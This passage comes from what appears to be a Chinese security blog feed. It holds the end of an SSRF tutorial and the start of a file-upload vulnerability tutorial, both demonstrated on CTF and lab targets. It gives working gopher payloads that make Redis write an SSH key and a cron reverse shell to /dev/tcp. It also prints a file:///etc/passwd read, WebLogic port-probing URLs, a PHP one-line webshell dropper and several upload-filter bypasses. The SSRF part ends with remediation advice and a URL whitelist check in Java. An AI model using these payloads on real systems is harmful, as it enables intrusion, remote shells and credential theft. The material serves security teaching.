$_GET[&#39;url&#39;]); #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0); #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch); curl_close($ch);  ?&gt;</code></pre><p>开启PHP的web环境，访问<a href="http://localhost/ssrf.php?url=，页面显示正常即可。在一个bash中开启监听端口，来模仿即将被SSRF到的内网服务，此处采用nc。" target="_blank" rel="noopener">http://localhost/ssrf.php?url=，页面显示正常即可。在一个bash中开启监听端口，来模仿即将被SSRF到的内网服务，此处采用nc。</a></p><p>浏览器访问如下链接：<code>http://localhost/ssrf.php?url=http://127.0.0.1:2233</code>。监听端可以看到来自localhost的请求，请求目标为127.0.0.1的2233端口。</p><p><img src="\2019\06\SSRF\1560156050670.png" alt="1560156050670"></p><p>使用gopher协议来查看协议，访问：<code>http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_test</code></p><p><img src="\2019\06\SSRF\1560156243997.png" alt="1560156243997"></p><p>利用gopher发送POST的请求，访问：<code>http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword</code></p><p><img src="\2019\06\SSRF\1560157345590.png" alt="1560157345590"></p><p>以上方式简单的展示了SSRF的攻击过程和请求，下面我们使用回显形SSRF。</p><p>漏洞环境：Ubuntu 18、 docker 、PHP、Apache</p><p>漏洞文件地址：<a href="https://github.com/nikosdano/SSRF-Vulnerable-with-Curl" target="_blank" rel="noopener">https://github.com/nikosdano/SSRF-Vulnerable-with-Curl</a></p><p>下载文件放入apache服务器中，访问<a href="http://192.168.120.132/awesome_script.php" target="_blank" rel="noopener">http://192.168.120.132/awesome_script.php</a></p><p><img src="\2019\06\SSRF\1560158703440.png" alt="1560158703440"></p><p>在其中我们可以填写想要执行的SSRF命令，如填写<code>file:///etc/passwd</code>，回显为：</p><p><img src="\2019\06\SSRF\1560158751037.png" alt="1560158751037"></p><p>尝试端口探测，对22端口进行探测是否开启：</p><p><img src="\2019\06\SSRF\1560159113711.png" alt="1560159113711"></p><p>截至到此，相信对SSRF已经有了一个简单认识和检测，下面我们利用一个靶场来模拟一个完整的真实的SSRF攻击。</p><h3 id="0x06、实战演示"><a href="#0x06、实战演示" class="headerlink" title="0x06、实战演示"></a>0x06、实战演示</h3><p>漏洞环境：Rootme CTF all the day</p><p>漏洞地址：<a href="https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/" target="_blank" rel="noopener">https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/</a></p><p>利用工具：Burp</p><p>漏洞介绍：SSRF+redis 获取内网主机权限，利用SSRF来对redis的未授权访问执行命令。从而达到获取主机权限的目的</p><p>访问目标地址，如果没有账号，需要创建账号点击右上的绿色小加号来创建账号，创建完成后回到此页面。</p><p>找到一个处于none的虚拟机，点击房间名，如下的ctf04</p><p><img src="\2019\06\SSRF\1560159824044.png" alt="1560159824044"></p><p>进入房间后，选择需要创建的虚拟机，选择SSRF Box，点击保存，选择start the game。</p><p><img src="\2019\06\SSRF\1560159878492.png" alt="1560159878492"></p><p>过一段时间的等待后，会显示如下信息。</p><p><img src="\2019\06\SSRF\1560235776984.png" alt="1560235776984"></p><p>访问 ctf04.root-me.org 就可以看到启动的虚拟环境了</p><p><img src="\2019\06\SSRF\1560235872860.png" alt="1560235872860"></p><p>当然，如果在创建虚拟机之前，看到其他的房间有人已经创建了SSRF Box我们也可以加入此玩家的房间，点击房间名，进入房间后点击右上角的Join the game。稍等片刻就可以加入到游戏中，根据提示访问对应的地址就可以开始测试啦。</p><p>访问地址后可以看到页面显示一个输入框，需要输入url参数，开始抓包。</p><p><img src="\2019\06\SSRF\1560235989336.png" alt="1560235989336"></p><p>尝试在页面输入百度地址后，页面会把百度首页加载进此页面中。</p><p><img src="\2019\06\SSRF\1560236149809.png" alt="1560236149809"></p><p>读取系统文件：</p><p><img src="\2019\06\SSRF\1560236739185.png" alt="1560236739185"></p><p>使用burp的Intruder模块，来探测开放的服务端口，开放则显示OK，不开放则显示Connection refused。</p><p><img src="\2019\06\SSRF\1560238637396.png" alt="1560238637396"></p><p>探测可知内网开放了6379端口redis服务，尝试利用SSRF对redis执行未授权漏洞，此处简单科普一下redis漏洞影响。</p><p>详细内容可以查看文章：<a href="https://www.freebuf.com/vuls/162035.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/162035.html</a></p><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p><p>因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。</p><p>1、利用redis来写ssh密钥：</p><p>此处利用ssh生成一对公私钥，生成的默认文件为id_rsa.pub和id_rsa。把id_rsa.pub上传至服务器即可。我们利用redis把目录设置为ssh目录下：</p><p>根据网上写密钥有两种协议可以使用，一种是dict，一种是gopher。测试使用dict协议写不成功，写入后不能连接，此处使用gopher写密钥。</p><p>使用的payload为：</p><pre><code>gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$401%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU+RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></pre><p>payload 解码为：</p><pre><code>gopher://127.0.0.1:6379/_*3$3set$11$401ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9*4$6config$3set$3dir$11/root/.ssh/*4$6config$3set$10dbfilename$15authorized_keys*1$4save*1$4quit</code></pre><p>payload由joychou的反弹shell修改而来，主要就是替换了写入文件的位置和文件内容。然后修改文件的长度。</p><p>然后尝试登陆，输入创建密钥的密码后，登陆成功。</p><p><img src="\2019\06\SSRF\1560327409402.png" alt="1560327409402"></p><p>2、利用redis写定时任务来反弹shell</p><p>既然提到反弹shell，就需要利用一台外网主机。此处使用了nc做端口监听。</p><p>使用payload为以下：</p><pre><code>gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></pre><p>解码后的内容就是：</p><pre><code>gopher://127.0.0.1:6379/_*3$3set$11$61*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1*4$6config$3set$3dir$16/var/spool/cron/*4$6config$3set$10dbfilename$4root*1$4save*1$4quit</code></pre><p>来自：<a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></p><p>其中$61为我的vps地址，也就是<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a</code>的字符串长度。执行后稍等片刻就可以收到反弹的shell了。同时需要写入的命令前后要加几个回车。</p><p><img src="\2019\06\SSRF\1560323581419.png" alt="1560323581419"></p><p>根据前文的提示，打开/passwd文件就可以找到flag了。</p><p><img src="\2019\06\SSRF\1560323642659.png" alt="1560323642659"></p><p>在网站页面上输入这一串字符，就可以结束这场SSRF之旅了。</p><p><img src="\2019\06\SSRF\1560325344529.png" alt="1560325344529"></p><h3 id="0x07、CMS实战演示"><a href="#0x07、CMS实战演示" class="headerlink" title="0x07、CMS实战演示"></a>0x07、CMS实战演示</h3><p>漏洞环境：vulhub、weblogic、ssrf</p><p>漏洞介绍：CVE-2014-4210，weblogic的uddiexplorer.war存在安全组件漏洞，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性。该漏洞的影响版本包括：10.0.2.0, 10.3.6.0</p><p>漏洞下载地址：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p><p>下载vulhub后，进入对应的安装目录，执行<code>docker-compose up -d</code>,会自动创建docker镜像。</p><p>构建完成后访问如下地址：</p><pre><code>/uddiexplorer/SearchPublicRegistries.jsp</code></pre><p><img src="\2019\06\SSRF\1560402971016.png" alt="1560402971016"></p><p>访问如下地址时返回，代表端口未开放：</p><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80</code></pre><p><img src="\2019\06\SSRF\1560403060035.png" alt="1560403060035"></p><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</code></pre><p>响应可以看到返回404，证明端口开放：</p><p><img src="\2019\06\SSRF\1560403107077.png" alt="1560403107077"></p><p>然后可以根据遍历查看开放的端口服务，在根据开放的服务来决定是否能不能执行内网攻击。而实际中越到的SSRF大都是探测类使用，因为能正好搭配使用的情况，而且还可以查看或者反弹的，概率值得讨论。</p><p>漏洞修复：1.删除server/lib/uddiexplorer.war下的相应jsp文件。</p><pre><code>jar -xvf uddiexplorer.war rm jsp-files jar -cvfM uddiexplorer.war uddiexplorer/</code></pre><ol start="2"><li>在官方的漏洞通报上找到补丁安装，<a href="https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</a></li></ol><h3 id="0x08、漏洞修复"><a href="#0x08、漏洞修复" class="headerlink" title="0x08、漏洞修复"></a>0x08、漏洞修复</h3><p>SSRF漏洞修复：</p><ol><li>限制返回信息的，例如请求文件，只返回文件是否请求成功，没有请求成功到文件统一返回错误信息。</li><li>对请求地址设置白名单，只允许请求白名单内的地址。</li><li>禁用除http和https外的协议，如：file://，gopher://，dict://等</li><li>限制请求的端口为固定服务端口，如：80，443</li><li>Java类代码修复，来自：joychou</li></ol><p>方法调用：</p><pre><code class="java">String[] urlwhitelist = {&quot;joychou.com&quot;, &quot;joychou.me&quot;};if (!UrlSecCheck(url, urlwhitelist)) {    return;}   </code></pre><p>方法代码：</p><p>需要先添加guava库（目的是获取一级域名）</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;com.google.guava&lt;/groupId&gt;    &lt;artifactId&gt;guava&lt;/artifactId&gt;    &lt;version&gt;21.0&lt;/version&gt;&lt;/dependency&gt;方法实现：public static Boolean UrlSecCheck(String url, String[] urlwhitelist) {    try {        URL u = new URL(url);        // 只允许http和https的协议        if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) {            return  false;        }        // 获取域名，并转为小写        String host = u.getHost().toLowerCase();        // 获取一级域名        String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString();        for (String whiteurl: urlwhitelist){            if (rootDomain.equals(whiteurl)) {                return true;            }        }        return false;    } catch (Exception e) {        return false;    }}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01、漏洞简介&quot;&gt;&lt;a href=&quot;#0x01、漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01、漏洞简介&quot;&gt;&lt;/a&gt;0x01、漏洞简介&lt;/h3&gt;&lt;p&gt;​    SSRF(Server-Side Request Forgery:服务器端
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>/2019/05/文件上传漏洞/</id>
    <published>2019-05-30T06:11:55.000Z</published>
    <updated>2019-06-03T01:50:18.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01、漏洞简介"><a href="#0x01、漏洞简介" class="headerlink" title="0x01、漏洞简介"></a>0x01、漏洞简介</h2><p>​       文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p><h2 id="0x02、漏洞原理"><a href="#0x02、漏洞原理" class="headerlink" title="0x02、漏洞原理"></a>0x02、漏洞原理</h2><p>​        网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。 </p><h2 id="0x03、漏洞危害"><a href="#0x03、漏洞危害" class="headerlink" title="0x03、漏洞危害"></a>0x03、漏洞危害</h2><p>​        恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件。</p><h2 id="0x04、常用绕过形式"><a href="#0x04、常用绕过形式" class="headerlink" title="0x04、常用绕过形式"></a>0x04、常用绕过形式</h2><h3 id="0x04-1、文件长传常见点"><a href="#0x04-1、文件长传常见点" class="headerlink" title="0x04-1、文件长传常见点"></a>0x04-1、文件长传常见点</h3><pre><code>上传头像上传相册上传附件添加文章图片前台留言资料上传编辑器文件上传......</code></pre><p>例如如下编辑器上传点：</p><p><img src="/2019/05/文件上传漏洞/1559525399747.png" alt="1559525399747"></p><p>文件管理处文件上传：</p><p><img src="/2019/05/文件上传漏洞/1559525465670.png" alt="1559525465670"></p><p>前台用户发表文章处文件上传：</p><p><img src="/2019/05/文件上传漏洞/1559525540726.png" alt="1559525540726"></p><p>个人头像处文件上传：</p><p><img src="/2019/05/文件上传漏洞/1559525602088.png" alt="1559525602088"></p><h3 id="0x04-2、后缀绕过"><a href="#0x04-2、后缀绕过" class="headerlink" title="0x04-2、后缀绕过"></a>0x04-2、后缀绕过</h3><pre><code>PHP:php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)ASP：asa、cer、cdxASPX：ascx、ashx、asacJSP：jsp、jspx、jspf</code></pre><h3 id="0x04-3、绕过类型"><a href="#0x04-3、绕过类型" class="headerlink" title="0x04-3、绕过类型"></a>0x04-3、绕过类型</h3><pre><code>Content-Type绕过前端绕过文件解析规则绕过Windows环境特性绕过文件名大小写绕过双写绕过点空格绕过文件头绕过条件竞争绕过......</code></pre><p>在以下的文章介绍中，将采取其中的几种常见的绕过形式做演示。</p><h2 id="0x05、漏洞在系统中的差异"><a href="#0x05、漏洞在系统中的差异" class="headerlink" title="0x05、漏洞在系统中的差异"></a>0x05、漏洞在系统中的差异</h2><p>​        上传文件漏洞在不同的系统、架构以及行为中，利用形式也是各不相同。常用的web容器有IIS、Tomcat、Nginx、Apache等。以下主要以比较经典的解析漏洞做解释。</p><h3 id="0x05-1、IIS-5-x-6-0解析漏洞"><a href="#0x05-1、IIS-5-x-6-0解析漏洞" class="headerlink" title="0x05-1、IIS 5.x/6.0解析漏洞"></a>0x05-1、IIS 5.x/6.0解析漏洞</h3><pre><code>1、当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件。例如如下：漏洞目录利用形式：www.xxx.com/xx.asp/xx.jpg。xx.jpg的内容可以为一段合法的asp脚本文件。2、服务器默认不解析”;“以后的内容，导致xx.asp;.jpg被解析成xx.asp漏洞文件利用形式：www.xxx.com/xx.asp;.jpgxx.jpg的内容可以为一段合法的asp脚本文件。</code></pre><p>漏洞产生的原因参考详细文章内容：<a href="https://www.cnblogs.com/l1pe1/p/9210094.html" target="_blank" rel="noopener">https://www.cnblogs.com/l1pe1/p/9210094.html</a></p><pre><code>通过对IIS6的核心文件类型解析相关文件的逆向后，整理出下面的核心处理代码。//reverse code by golds7n with idaint __thiscall Url(void *this, char *UrlStruct){  void *pW3_URL_INFO; // esi@1  int bSuccess; // eax@1  const wchar_t *i; // eax@2  wchar_t *wcsSlashTemp; // ebx@6  int wcsTemp; // eax@6  int wcs_Exten; // eax@6  int v8; // esi@9  int v10; // eax@11  int v11; // ST04_4@13  int v12; // eax@13  int ExtenDll; // eax@19  int Extenisa; // eax@20  int ExtenExe; // eax@21  int ExtenCgi; // eax@22  int ExtenCom; // eax@23  int ExtenMap; // eax@24  int Entry; // [sp+Ch] [bp-148h]@6  wchar_t *wcsMaohaoTemp; // [sp+10h] [bp-144h]@6  unsigned int dotCount; // [sp+14h] [bp-140h]@1  wchar_t *Str; // [sp+18h] [bp-13Ch]@3  char *url_FileName; // [sp+1Ch] [bp-138h]@1  char Url_FileExtenName; // [sp+20h] [bp-134h]@1  char v25; // [sp+50h] [bp-104h]@1 dotCount = 0;  pW3_URL_INFO = this;  STRU::STRU(&amp;Url_FileExtenName, &amp;v25, 0x100u);  url_FileName = (char *)pW3_URL_INFO + 228;  bSuccess = STRU::Copy((char *)pW3_URL_INFO + 228, UrlStruct);  if ( bSuccess &lt; 0 )    goto SubEnd;  for ( i = (const wchar_t *)STRU::QueryStr((char *)pW3_URL_INFO + 228); ; i = Str + 1 )  {    Str = _wcschr(i, &#39;.&#39;);   ***********N1************    if ( !Str )      break;    ++dotCount;    if ( dotCount &gt; W3_URL_INFO::sm_cMaxDots )      break;    bSuccess = STRU::Copy(&amp;Url_FileExtenName, Str);    if ( bSuccess &lt; 0 )      goto SubEnd;    wcsSlashTemp = _wcschr(Str, &#39;/&#39;); ***********N2************    JUMPOUT(wcsSlashTemp, 0, loc_5A63FD37);    wcsTemp = STRU::QueryStr(&amp;Url_FileExtenName);    wcsMaohaoTemp = _wcschr((const wchar_t *)wcsTemp, &#39;:&#39;);  ***********N3************    JUMPOUT(wcsMaohaoTemp, 0, loc_5A63FD51);    wcs_Exten = STRU::QueryStr(&amp;Url_FileExtenName);    __wcslwr((wchar_t *)wcs_Exten);    if ( META_SCRIPT_MAP::FindEntry(&amp;Url_FileExtenName, &amp;Entry) )    {      *((_DWORD *)pW3_URL_INFO + 201) = Entry;      JUMPOUT(wcsSlashTemp, 0, loc_5A63FDAD);      STRU::Reset((char *)pW3_URL_INFO + 404);      break;    }    if ( STRU::QueryCCH(&amp;Url_FileExtenName) == 4 )    {      ExtenDll = STRU::QueryStr(&amp;Url_FileExtenName);      if ( !_wcscmp(L&quot;.dll&quot;, (const wchar_t *)ExtenDll)        || (Extenisa = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.isa&quot;, (const wchar_t *)Extenisa)) )        JUMPOUT(loc_5A63FD89);      ExtenExe = STRU::QueryStr(&amp;Url_FileExtenName);      if ( !_wcscmp(L&quot;.exe&quot;, (const wchar_t *)ExtenExe)        || (ExtenCgi = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.cgi&quot;, (const wchar_t *)ExtenCgi))        || (ExtenCom = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.com&quot;, (const wchar_t *)ExtenCom)) )        JUMPOUT(loc_5A63FD89);      ExtenMap = STRU::QueryStr(&amp;Url_FileExtenName);      JUMPOUT(_wcscmp(L&quot;.map&quot;, (const wchar_t *)ExtenMap), 0, loc_5A63FD7B);    }  }  if ( *((_DWORD *)pW3_URL_INFO + 201)    || (v10 = *((_DWORD *)pW3_URL_INFO + 202), v10 == 3)    || v10 == 2    || (v11 = *(_DWORD *)(*((_DWORD *)pW3_URL_INFO + 204) + 0xC4C),        v12 = STRU::QueryStr(url_FileName),        bSuccess = SelectMimeMappingForFileExt(v12, v11, (char *)pW3_URL_INFO + 756, (char *)pW3_URL_INFO + 1012),        bSuccess &gt;= 0) )    v8 = 0;  elseSubEnd:    v8 = bSuccess;  STRU::_STRU(&amp;Url_FileExtenName);  return v8;}</code></pre><p>以上有三处被标记的位置，这三处是用来检测点号、反斜杠、分号。、</p><p>可以理解为的检测流程为：</p><pre><code>www.xxx.com/xxx.asp;xxx.jpgN1:从头部查找查找&quot;.&quot;号,获得&quot;.asp;xxxx.jpg&quot;N2:查找&quot;;&quot;号,如果有则内存截断N3:查找&quot;/&quot;,如果有则内存截断</code></pre><p>因此，.asp将最终被保存下来，IIS6只简单地根据扩展名来识别，所以从脚本映射表中里查找脚本与扩展名对比，并利用asp.dll来解析。导致最终的问题产生。</p><p>对于此问题，微软并不认为这是一个漏洞，同样也没推出IIS6.0解析漏洞的补丁。因此在IIS6.0的网站下，此问题仍然可以尝试是否存在。</p><h3 id="0x05-2、Nginx-解析漏洞"><a href="#0x05-2、Nginx-解析漏洞" class="headerlink" title="0x05-2、Nginx 解析漏洞"></a>0x05-2、Nginx 解析漏洞</h3><p>​        Nginx是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点开发的。</p><p>​        在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。为什么是由于PHP-CGI的原因呢，因为在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析。</p><p>​        普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。访问 ”<a href="http://www.xx.com/phpinfo.jpg/1.php”" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php”</a> 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP-CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p><p>​        在默认Fast-CGI开启状况下上传名字为xx.jpg,内容为:<br><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p><p>然后访问xx.jpg/.php,在这个目录下就会生成一句话木马shell.php。同样利用phpstudy说明，上传1.jpg格式的文件，内容为访问phpinfo，如下即可触发：</p><p><img src="\2019\05\文件上传漏洞\1559013919103.png" alt="1559013919103"></p><h3 id="0x05-3、Apache-解析漏洞"><a href="#0x05-3、Apache-解析漏洞" class="headerlink" title="0x05-3、Apache 解析漏洞"></a>0x05-3、Apache 解析漏洞</h3><p>​        Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl/Python等解释器编译到服务器中。</p><p>​        Apache 在1.x和2.x版本中存在解析漏洞，例如如下地址格式：</p><pre><code>www.xxxx.com/apache.php.bbb.aaa</code></pre><p>Apache从右至左开始判断后缀，若aaa非可识别后缀，再判断bbb，直到找到可识别后缀为止，然后将该可识别后缀进解析，因此如上地址解析为访问apache.php文件。</p><p>​        那么为什么会产生此问题原因，在Apache的官方网站上，有一句这么关于“extension”的解释：</p><pre><code>地址：http://httpd.apache.org/docs/current/mod/directive-dict.htmlextensionIn general, this is the part of the filename which follows the last dot. However, Apache recognizes multiple filename extensions, so if a filename contains more than one dot, each dot-separated part of the filename following the first dot is an extension. For example, the filename file.html.en contains two extensions: .html and .en. For Apache directives, you may specify extensions with or without the leading dot. In addition, extensions are not case sensitive.</code></pre><p><img src="\2019\05\文件上传漏洞\1559021484728.png" alt="1559021484728"></p><p>​        通过这个解释可以看出来，Apache允许文件有多个后缀名，并会按照第一个点来分析文件后缀，例如file.html.en。Apache按照每个点来分割后缀名，因此此文件名为.html、.en。由于en后缀不被识别，便继续向前解析。</p><p>​        另外对于Apache解析漏洞的正确说法应该是，使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcig模式与php结合的所有版本apache不存在此漏洞。而是否解析的后缀名在文件mime.types中查找是否出现。</p><p>​        此处使用phpstudy测试，利用dvwa的文件上传功能，上传1.php.wwe。结果解析如下：</p><p><img src="\2019\05\文件上传漏洞\1559032463726.png" alt="1559032463726"></p><h2 id="0x06、测试方法"><a href="#0x06、测试方法" class="headerlink" title="0x06、测试方法"></a>0x06、测试方法</h2><p>对于文件上传漏洞方式和举例此处采用一个文件靶场，地址：<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p><p>以下将利用靶场其中的一部分内容来举例说明文件上传漏洞的产生和效果。</p><p>环境：Ubuntu 18、Windows phpStudy (采用不一样的系统，为了在不同系统的差异做演示)</p><p>WEB容器：Apache 2.0</p><p>语言：PHP</p><p>抓包工具：Burp Suite Pro</p><p>验证工具：Hackbar插件</p><h3 id="0x06-1、前端验证"><a href="#0x06-1、前端验证" class="headerlink" title="0x06-1、前端验证"></a>0x06-1、前端验证</h3><p>此种验证形式在很多网站、CMS都有使用，只在前端利用JS来做效验，采用禁用JS上传、抓包上传都可以绕过此处限制。此处采用抓包演示。</p><p><img src="\2019\05\文件上传漏洞\1559032778870.png" alt="1559032778870"></p><p>点击上传文件，选择已经改成“.jpg”后缀的后门文件。修改burp中的文件后缀信息。</p><p><img src="\2019\05\文件上传漏洞\1559032949667.png" alt="1559032949667"></p><p>访问已经上传的文件，利用Hackbar访问phpinfo()。可以看到后门已经得到执行。</p><p><img src="\2019\05\文件上传漏洞\1559033444502.png" alt="1559033444502"></p><h3 id="0x06-2、-htaccess规则文件绕过"><a href="#0x06-2、-htaccess规则文件绕过" class="headerlink" title="0x06-2、.htaccess规则文件绕过"></a>0x06-2、.htaccess规则文件绕过</h3><p>​        在利用.htaccess文件之前，我们先来了解一下什么是.htaccess规则文件。.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。</p><p>​        概述来说，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>​        在一些启用了.htaccess文件的网站上就可以使用此文件类型来绕过限制较全面的黑名单过滤。</p><p>​        先上传一个.htaccess文件，内容为：<code>AddType application/x-httpd-php .aaa</code>。如下：</p><p><img src="\2019\05\文件上传漏洞\1559034387907.png" alt="1559034387907"></p><p>​        然后再上传文件后缀为.aaa的文件，让其解析为php类型文件。</p><p><img src="\2019\05\文件上传漏洞\1559034547623.png" alt="1559034547623"></p><p>​        上传成功后访问此上传文件，访问如下：</p><p><img src="\2019\05\文件上传漏洞\1559034597893.png" alt="1559034597893"></p><h3 id="0x06-3、文件名后缀大小写混合绕过"><a href="#0x06-3、文件名后缀大小写混合绕过" class="headerlink" title="0x06-3、文件名后缀大小写混合绕过"></a>0x06-3、文件名后缀大小写混合绕过</h3><p>​        在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。如下形式：</p><p><img src="\2019\05\文件上传漏洞\1559035809669.png" alt="1559035809669"></p><p>​        访问上传成功的文件：</p><p><img src="\2019\05\文件上传漏洞\1559035839659.png" alt="1559035839659"></p><h3 id="0x06-4、Windows文件流特性绕过"><a href="#0x06-4、Windows文件流特性绕过" class="headerlink" title="0x06-4、Windows文件流特性绕过"></a>0x06-4、Windows文件流特性绕过</h3><p>​        在讨论这种特性之前，我们先来认识一下Windows文件流。流文件，即NTFS交换数据流（alternate data 